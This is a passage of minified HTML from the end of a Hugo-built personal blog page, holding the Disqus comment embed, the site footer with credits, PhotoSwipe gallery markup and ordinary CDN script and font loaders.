available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//k1te.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 k1te's blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
